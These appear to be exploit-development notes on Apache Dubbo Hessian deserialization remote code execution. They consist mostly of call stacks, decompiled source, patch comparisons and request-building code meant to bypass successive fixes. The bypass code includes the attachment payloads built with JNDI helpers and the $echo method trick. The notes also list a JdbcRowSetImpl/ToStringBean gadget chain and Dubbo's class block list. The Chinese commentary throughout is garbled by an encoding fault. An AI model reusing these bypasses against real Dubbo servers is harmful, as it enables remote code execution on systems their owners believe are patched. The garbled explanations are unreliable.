CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:137, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:73, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decodeBody:132, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:122, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec) decode:82, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec) decode:48, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo) decode:90, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4) decodeRemovalReentryProtection:502, ByteToMessageDecoder (io.netty.handler.codec) callDecode:441, ByteToMessageDecoder (io.netty.handler.codec) channelRead:278, ByteToMessageDecoder (io.netty.handler.codec) invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel) invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel) fireChannelRead:352, AbstractChannelHandlerContext (io.netty.channel) channelRead:1408, DefaultChannelPipeline$HeadContext (io.netty.channel) invokeChannelRead:374, AbstractChannelHandlerContext (io.netty.channel) invokeChannelRead:360, AbstractChannelHandlerContext (io.netty.channel) fireChannelRead:930, DefaultChannelPipeline (io.netty.channel) read:163, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio) processSelectedKey:682, NioEventLoop (io.netty.channel.nio) processSelectedKeysOptimized:617, NioEventLoop (io.netty.channel.nio) processSelectedKeys:534, NioEventLoop (io.netty.channel.nio) run:496, NioEventLoop (io.netty.channel.nio) run:906, SingleThreadEventExecutor$5 (io.netty.util.concurrent) run:74, ThreadExecutorMap$2 (io.netty.util.internal) run:30, FastThreadLocalRunnable (io.netty.util.concurrent) run:748, Thread (java.lang) inv = new DecodeableRpcInvocation(channel, req, is, proto); inv.decode(); åˆ°å­—ç¬¦ä¸²æ‹¼æ¥ &quot;, message:&quot; + inv //inv ä¸º DecodeableRpcInvocation è§¦å‘StringBuilder.append @Override public StringBuilder append(Object obj) &#123; return append(String.valueOf(obj)); &#125; public static String valueOf(Object obj) &#123; return (obj == null) ? &quot;null&quot; : obj.toString(); &#125; RpcInvocation.toString() public String toString() &#123; return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;; &#125;//Arrays.toString(this.arguments) Arrays.toString public static String toString(Object[] a) &#123; ... for (int i = 0; ; i++) &#123; b.append(String.valueOf(a[i])); dubbo2.7.5https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346 è¡¥ä¸DubboProtocol.getInvocationWithoutData if (exporter == null) &#123; throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv)); private Invocation getInvocationWithoutData(Invocation invocation) &#123; if (this.logger.isDebugEnabled()) &#123;//å¼€å¯debug ä»å¯è§¦å‘ return invocation; &#125; else if (invocation instanceof RpcInvocation) &#123; RpcInvocation rpcInvocation = (RpcInvocation)invocation; rpcInvocation.setArguments((Object[])null);//æ¸…ç©ºé˜²æ­¢ RpcInvocation.toString è§¦å‘ Arrays.toString(this.arguments) return rpcInvocation; &#125; else &#123; return invocation; &#125; &#125; sink1//ä½†æ˜¯attachments dubbo2.7.5 è¡¥ä¸åªæ¸…ç©º arguments java exp è®¾ç½® attachments é‡ç‚¹å…³æ³¨å‡ ä¸ª in.readxxx()ï¼Œexpå¯¹åº”out.writexxx() public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); this.put(&quot;serialization_id&quot;, this.serializationType); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); String version = in.readUTF(); this.setAttachment(&quot;version&quot;, version); this.setMethodName(in.readUTF()); String desc = in.readUTF(); this.setParameterTypesDesc(desc); try &#123; if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123; CodecSupport.checkSerialization(path, version, this.serializationType); &#125; Object[] args = DubboCodec.EMPTY_OBJECT_ARRAY; Class&lt;?&gt;[] pts = DubboCodec.EMPTY_CLASS_ARRAY; if (desc.length() &gt; 0) &#123; //&quot;&quot;.length()=0 &#125; this.setParameterTypes(pts); Map&lt;String, Object&gt; map = in.readAttachments();//bypass3//è§¦å‘hashmapçš„put if (map != null &amp;&amp; map.size() &gt; 0) &#123; Map&lt;String, Object&gt; attachment = this.getObjectAttachments(); if (attachment == null) &#123; attachment = new HashMap(); &#125; ((Map)attachment).putAll(map); this.setObjectAttachments((Map)attachment);//è®¾ç½®attachment//åç»­è§¦å‘toString &#125; exp//bypass1å¯ä»¥ç®€åŒ–//å¹¶ä¸”ç»•è¿‡2.7.7 out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); // out.writeUTF(&quot;Ljava/lang/Object;&quot;); // out.writeObject(&quot;sayHello1&quot;); out.writeUTF(&quot;&quot;); HashMap attachments = getJNDI1(uri);//attachments out.writeObject(attachments); è§¦å‘ä¸¤æ¬¡å‘½ä»¤æ‰§è¡Œ getInvoker:264, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo) reply:123, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo) received:155, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo) received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header) received:51, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) toString:442, RpcInvocation (org.apache.dubbo.rpc) safeToString:63, Request (org.apache.dubbo.remoting.exchange) toString:143, Request (org.apache.dubbo.remoting.exchange) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) åŒºåˆ«ç‚¹DubboCodec.decodeBody protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException &#123; byte flag = header[2]; byte proto = (byte)(flag &amp; 31); long id = Bytes.bytes2long(header, 4); ObjectInput in; if ((flag &amp; -128) == 0) &#123; ... &#125; &#125; else &#123; Request req = new Request(id); req.setVersion(Version.getProtocolVersion()); req.setTwoWay((flag &amp; 64) != 0); if ((flag &amp; 32) != 0) &#123; req.setEvent(true); &#125; try &#123; Object data; if (req.isEvent()) &#123;//å…¶ä»–sink in = CodecSupport.deserialize(channel.getUrl(), is, proto); data = this.decodeEventData(channel, in); &#125; else &#123; DecodeableRpcInvocation inv; if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) &#123; inv = new DecodeableRpcInvocation(channel, req, is, proto); inv.decode();//sink1 sink2//åååºåˆ—åŒ–https://www.cnblogs.com/bitterz/p/15526206.html åœ¨readUTFçš„ä½ç½®writeObject(HashMap) protected IOException expect(String expect, int ch) throws IOException &#123; if (ch &lt; 0) &#123; return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;); &#125; else &#123; --this._offset; try &#123; Object obj = this.readObject(); return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;); expect:3517, Hessian2Input (com.alibaba.com.caucho.hessian.io) readString:1853, Hessian2Input (com.alibaba.com.caucho.hessian.io) readUTF:80, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) decode:112, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:748, Thread (java.lang) DecodeableRpcInvocation public Object decode(Channel channel, InputStream input) throws IOException &#123; ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input); String dubboVersion = in.readUTF(); this.request.setVersion(dubboVersion); this.setAttachment(&quot;dubbo&quot;, dubboVersion); String path = in.readUTF(); this.setAttachment(&quot;path&quot;, path); this.setAttachment(&quot;version&quot;, in.readUTF()); this.setMethodName(in.readUTF()); String desc = in.readUTF();// public String readUTF() throws IOException &#123; return this.mH2i.readString(); &#125; public String readString() throws IOException &#123; int tag = this.read(); int ch; switch(tag) &#123; case 0: ... case 31: this._isLastChunk = true; this._chunkLength = tag - 0; this._sbuf.setLength(0); while((ch = this.parseChar()) &gt;= 0) &#123; this._sbuf.append((char)ch); &#125; return this._sbuf.toString(); case 32: ... case 127: default: throw this.expect(&quot;string&quot;, tag);//tag=72 è¿›å…¥sink exp out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); // out.writeObject(&quot;sayHello1&quot;);//æ³¨é‡Šä¸¤è¡Œ//bypass4 è§¦å‘ç‚¹åœ¨bypass3å‰ ä¸å—2.7.7é™åˆ¶ HashMap attachments = getJNDI1(uri); æŠ›å‡ºé”™è¯¯ï¼Œåªè§¦å‘ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œ default: throw this.expect(&quot;string&quot;, tag); sink3//ååºåˆ—åŒ–+åååºåˆ—åŒ–com.alibaba.com.caucho.hessian.io.MapDeserializer protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123; Deserializer keyDeserializer = null; Deserializer valueDeserializer = null; SerializerFactory factory = this.findSerializerFactory(in); if (keyType != null) &#123; keyDeserializer = factory.getDeserializer(keyType.getName()); &#125; if (valueType != null) &#123; valueDeserializer = factory.getDeserializer(valueType.getName()); &#125; while(!in.isEnd()) &#123; map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject()); &#125; exp // String path = &quot;org.apache.dubbo.spring.boot.demo.consumer.DemoService&quot;; String path = &quot;org.apache.dubbo.samples.basic.api.DemoService&quot;; // String path = &quot;top.lz2y.service.DemoService1&quot;; // String server_ver = &quot;1.0.0&quot;; String server_ver = &quot;&quot;; // String method = &quot;any&quot;;// &lt;=2.7.6 String method = &quot;$echo&quot;;//add 2.7.7-2.7.12 out.writeUTF(dubbover); out.writeUTF(path); out.writeUTF(server_ver); out.writeUTF(method); //todo æ–¹æ³•æè¿°ä¸éœ€è¦ä¿®æ”¹ï¼Œå› ä¸ºæ­¤å¤„éœ€è¦æŒ‡å®šmapçš„payloadå»è§¦å‘ out.writeUTF(&quot;Ljava/lang/Object;&quot;); out.writeObject(&quot;any&quot;); HashMap attachments = getJNDI2(uri);//2.7.13æ‰§è¡Œ5æ¬¡//ä½¿ç”¨EqualsBean//æ­£ç¡®çš„pathå¯ä»¥-2æ¬¡ // HashMap attachments = getJNDI1(uri);//attachments//2.7.13æ‰§è¡Œ3æ¬¡ out.writeObject(attachments); ä¸‰æ¬¡å‘½ä»¤æ‰§è¡Œ ååºåˆ—åŒ– getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:339, HashMap (java.util) put:612, HashMap (java.util) doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io) readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io) readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize) decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) ååºåˆ—åŒ– getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:339, HashMap (java.util) putMapEntries:515, HashMap (java.util) putAll:785, HashMap (java.util) decode:171, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) åååºåˆ—åŒ– getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset) invoke:-1, GeneratedMethodAccessor11 (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) toString:236, Object (java.lang) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) toString:557, AbstractMap (java.util) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) toString:443, RpcInvocation (org.apache.dubbo.rpc) safeToString:63, Request (org.apache.dubbo.remoting.exchange) toString:143, Request (org.apache.dubbo.remoting.exchange) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) hashmap.put(key,value)-&gt;key.toString()//javaååºåˆ—åŒ–gadgets 2.7.7ç»•è¿‡https://github.com/apache/dubbo/pull/6374 https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7 DecodeableRpcInvocation https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0 if (desc.length() &gt; 0) &#123;//sink1//ä½†æ˜¯attachments ç›´æ¥å°±ç»•è¿‡äº† ... if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123; if (!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())) &#123; throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());//2.7.6æŠ¥é”™é€€å‡º &#125; pts = ReflectUtils.desc2classArray(desc); &#125; RpcUtils public static boolean isGenericCall(String path, String method) &#123; return &quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method); &#125; public static boolean isEcho(String path, String method) &#123; return &quot;$echo&quot;.equals(method); &#125; æ”¹methodå³å¯ç»•è¿‡ sink1//ä½†æ˜¯attachments ä¹Ÿèƒ½ç»•è¿‡ sink2è§¦å‘ç‚¹åœ¨æŠ›å‡ºé”™è¯¯å‰ æ‰€ä»¥ç»•è¿‡ 2.7.92.7.8 protected Object decodeEventData(Channel channel, ObjectInput in) throws IOException &#123; try &#123; return in.readEvent(); &#125; catch (ClassNotFoundException | IOException var4) &#123; throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var4)); &#125; &#125; 2.7.9 protected Object decodeEventData(Channel channel, ObjectInput in, byte[] eventBytes) throws IOException &#123; try &#123; if (eventBytes != null) &#123; int dataLen = eventBytes.length; int threshold = ConfigurationUtils.getSystemConfiguration().getInt(&quot;deserialization.event.size&quot;, 50); if (dataLen &gt; threshold) &#123; throw new IllegalArgumentException(&quot;Event data too long, actual size &quot; + dataLen + &quot;, threshold &quot; + threshold + &quot; rejected for security consideration.&quot;); &#125; &#125; return in.readEvent(); &#125; catch (ClassNotFoundException | IOException var6) &#123; throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var6)); &#125; &#125; 2.7.13é»‘åå•æœªå¯ç”¨bypass3 doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io) readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io) readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io) readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize) decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) bypass4 expect:3566, Hessian2Input (com.alibaba.com.caucho.hessian.io) readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io) readUTF:90, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2) decode:122, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo) decode:57, DecodeHandler (org.apache.dubbo.remoting.transport) received:44, DecodeHandler (org.apache.dubbo.remoting.transport) run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher) runWorker:1149, ThreadPoolExecutor (java.util.concurrent) run:624, ThreadPoolExecutor$Worker (java.util.concurrent) run:41, InternalRunnable (org.apache.dubbo.common.threadlocal) run:748, Thread (java.lang) 2.7.14ä½¿ç”¨é»‘åå•bypass4 æŠ¥é”™ ä¸‰æœˆ 16, 2022 9:56:18 ä¸‹åˆ com.alibaba.com.caucho.hessian.io.ClassFactory load ä¸¥é‡: com.rometools.rome.feed.impl.ToStringBean in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead. ä¸‰æœˆ 16, 2022 9:56:18 ä¸‹åˆ com.alibaba.com.caucho.hessian.io.ClassFactory load ä¸¥é‡: com.sun.rowset.JdbcRowSetImpl in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead. [16/03/22 09:56:20:020 CST] DubboServerHandler-169.254.59.59:20880-thread-2 WARN dubbo.DecodeableRpcInvocation: [DUBBO] Decode rpc invocation failed: expected string at 0x48 java.util.HashMap (&#123;pwn=&#123;beanClass=class com.sun.rowset.JdbcRowSetImpl, at com.alibaba.com.caucho.hessian.io.Hessian2Input.error(Hessian2Input.java:3590) com.alibaba.com.caucho.hessian.io.ClassFactory 2.7.13 public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123; return Class.forName(className, false, this._loader); &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; private void initAllow() &#123; synchronized(this) &#123; if (this._allowList == null) &#123; this._allowList = new ArrayList(); this._allowList.addAll(_staticAllowList);//æ·»åŠ _allowList//ä½†æ˜¯æ²¡æœ‰ç›´æ¥æˆ–é—´æ¥è°ƒç”¨initAllow &#125; &#125; &#125; private boolean isAllow(String className) &#123; ArrayList&lt;ClassFactory.Allow&gt; allowList = this._allowList;//é»˜è®¤nullï¼Œæ²¡æœ‰åšé™åˆ¶ if (allowList == null) &#123; return true; 2.7.14 static &#123; ClassLoader classLoader = ClassFactory.class.getClassLoader(); try &#123; String[] denyClasses = readLines(classLoader.getResourceAsStream(&quot;DENY_CLASS&quot;)); String[] var2 = denyClasses; int var3 = denyClasses.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String denyClass = var2[var4]; if (!denyClass.startsWith(&quot;#&quot;)) &#123; if (denyClass.endsWith(&quot;.&quot;)) &#123; _staticAllowList.add(new ClassFactory.AllowPrefix(denyClass, false)); &#125; else &#123; _staticAllowList.add(new ClassFactory.Allow(toPattern(denyClass), false)); &#125; &#125; &#125; &#125; catch (IOException var6) &#123; &#125; &#125; ClassFactory(ClassLoader loader) &#123; this._loader = loader; this.initAllow();//ç›´æ¥è°ƒç”¨initAllow//åˆå§‹åŒ–_allowList &#125; public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123; if (this.isAllow(className)) &#123; Class&lt;?&gt; aClass = Class.forName(className, false, this._loader); if (_allowClassSet.containsKey(className)) &#123; return aClass; &#125; else &#123; Class aSuperClass; if (aClass.getInterfaces().length &gt; 0) &#123; Class[] var3 = aClass.getInterfaces(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; aSuperClass = var3[var5]; if (!this.isAllow(aSuperClass.getName())) &#123; log.log(Level.SEVERE, className + &quot;&#39;s interfaces: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; &#125; List&lt;Class&lt;?&gt;&gt; allSuperClasses = new LinkedList(); for(Class superClass = aClass.getSuperclass(); superClass != null; superClass = superClass.getSuperclass()) &#123; allSuperClasses.add(superClass); &#125; Iterator var9 = allSuperClasses.iterator(); do &#123; if (!var9.hasNext()) &#123; _allowClassSet.put(className, className); return aClass; &#125; aSuperClass = (Class)var9.next(); &#125; while(this.isAllow(aSuperClass.getName())); log.log(Level.SEVERE, className + &quot;&#39;s superClass: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class; &#125; &#125; else &#123; log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;); return HashMap.class;//ç™½åå•å¤–ï¼Œè¿”å› HashMap.class &#125; &#125; dubbo-2.7.14.jar/DENY_CLASS bsh. ch.qos.logback.core.db. clojure. com.alibaba.citrus.springext.support.parser. com.alibaba.citrus.springext.util.SpringExtUtil. com.alibaba.druid.pool. com.alibaba.hotcode.internal.org.apache.commons.collections.functors. com.alipay.custrelation.service.model.redress. com.alipay.oceanbase.obproxy.druid.pool. com.caucho.config.types. com.caucho.hessian.test. com.caucho.naming. com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller. com.ibm.xltxe.rnm1.xtq.bcel.util. com.mchange.v2.c3p0. com.mysql.jdbc.util. com.rometools.rome.feed. com.sun.corba.se.impl. com.sun.corba.se.spi.orbutil. com.sun.jndi.rmi. com.sun.jndi.toolkit. com.sun.org.apache.bcel.internal. com.sun.org.apache.xalan.internal. com.sun.rowset. com.sun.xml.internal.bind.v2. com.taobao.vipserver.commons.collections.functors. groovy.lang. java.beans. java.lang.ProcessBuilder java.lang.Runtime java.rmi.server. java.security. java.util.ServiceLoader javassist.bytecode.annotation. javassist.tools.web.Viewer javassist.util.proxy. javax.imageio. javax.imageio.spi. javax.management. javax.media.jai.remote. javax.naming. javax.script. javax.sound.sampled. javax.xml.transform. net.bytebuddy.dynamic.loading. oracle.jdbc.connector. oracle.jdbc.pool. org.apache.aries.transaction.jms. org.apache.bcel.util. org.apache.carbondata.core.scan.expression. org.apache.commons.beanutils. org.apache.commons.codec.binary. org.apache.commons.collections.functors. org.apache.commons.collections4.functors. org.apache.commons.configuration. org.apache.commons.configuration2. org.apache.commons.dbcp.datasources. org.apache.commons.dbcp2.datasources. org.apache.commons.fileupload.disk. org.apache.ibatis.executor.loader. org.apache.ibatis.javassist.bytecode. org.apache.ibatis.javassist.tools. org.apache.ibatis.javassist.util. org.apache.ignite.cache. org.apache.log.output.db. org.apache.log4j.receivers.db. org.apache.myfaces.view.facelets.el. org.apache.openjpa.ee. org.apache.openjpa.ee. org.apache.shiro. org.apache.tomcat.dbcp. org.apache.velocity.runtime. org.apache.velocity. org.apache.wicket.util. org.apache.xalan.xsltc.trax. org.apache.xbean.naming.context. org.apache.xpath. org.apache.zookeeper. org.aspectj.apache.bcel.util. org.codehaus.groovy.runtime. org.datanucleus.store.rdbms.datasource.dbcp.datasources. org.eclipse.jetty.util.log. org.geotools.filter. org.h2.value. org.hibernate.tuple.component. org.hibernate.type. org.jboss.ejb3. org.jboss.proxy.ejb. org.jboss.resteasy.plugins.server.resourcefactory. org.jboss.weld.interceptor.builder. org.mockito.internal.creation.cglib. org.mortbay.log. org.quartz. org.springframework.aop.aspectj. org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler org.springframework.beans.factory. org.springframework.expression.spel. org.springframework.jndi. org.springframework.orm. org.springframework.transaction. org.yaml.snakeyaml.tokens. pstore.shaded.org.apache.commons.collections. sun.rmi.server. sun.rmi.transport. weblogic.ejb20.internal. weblogic.jms.common. https://cloud.tencent.com/developer/article/1945763 CVE-2021-25641 Apache Dubbo 2.7.0 to 2.7.8 Apache Dubbo 2.6.0 to 2.6.9 Apache Dubbo all 2.5.x versions (å®˜æ–¹å·²ä¸å†æä¾›æ”¯æŒ) fastjson toString CVE-2021-30179https://www.modb.pro/db/145553 https://www.cvedetails.com/cve/CVE-2021-30179/ Apache Dubbo 2.7.0 to 2.7.9 Apache Dubbo 2.6.0 to 2.6.9 Apache Dubbo all 2.5.x versions (å®˜æ–¹å·²ä¸å†æä¾›æ”¯æŒ) 2.7.9 RpcUtils public static boolean isGenericCall(String parameterTypesDesc, String method) &#123; return (&quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method)) &amp;&amp; &quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;.equals(parameterTypesDesc); &#125; public static boolean isEcho(String parameterTypesDesc, String method) &#123; return &quot;$echo&quot;.equals(method) &amp;&amp; &quot;Ljava/lang/Object;&quot;.equals(parameterTypesDesc); &#125; ç±»å‹ä¸ºæ•°ç»„Ljava/lang/Object; ä½¿ç”¨$echo CVE-2021-36161https://www.cvedetails.com/cve/CVE-2021-36161/ Dubbo ä¸­çš„æŸäº›ç»„ä»¶ä¼šå°è¯•æ‰“å°è¾“å…¥å‚æ•°çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¯¹å¸¦æœ‰ç‰¹æ®Š toString æ–¹æ³•çš„æ¶æ„å®šåˆ¶ bean çš„ RCEã€‚åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬ä¿®å¤äº†è¶…æ—¶ã€ç¼“å­˜å’Œå…¶ä»–ä¸€äº›åœ°æ–¹çš„ toString è°ƒç”¨ã€‚Apache Dubbo 2.7.13 ä¿®å¤ CVE-2021-36163 CVE-2021-37579//source checkç»•è¿‡https://www.cvedetails.com/cve/CVE-2021-37579/ &lt;=2.7.12 Dubbo Provider ä¼šæ£€æŸ¥ä¼ å…¥çš„è¯·æ±‚ä»¥åŠè¯¥è¯·æ±‚å¯¹åº”çš„åºåˆ—åŒ–ç±»å‹æ˜¯å¦æ»¡è¶³æœåŠ¡å™¨è®¾ç½®çš„é…ç½®ã€‚ä½†æ˜¯æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä¸€ä¸ªä¾‹å¤–æ¥è·³è¿‡å®‰å…¨æ£€æŸ¥ï¼ˆå¯ç”¨æ—¶ï¼‰å¹¶ä½¿ç”¨æœ¬æœº java åºåˆ—åŒ–è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚Apache Dubbo 2.7.13ã€3.0.2 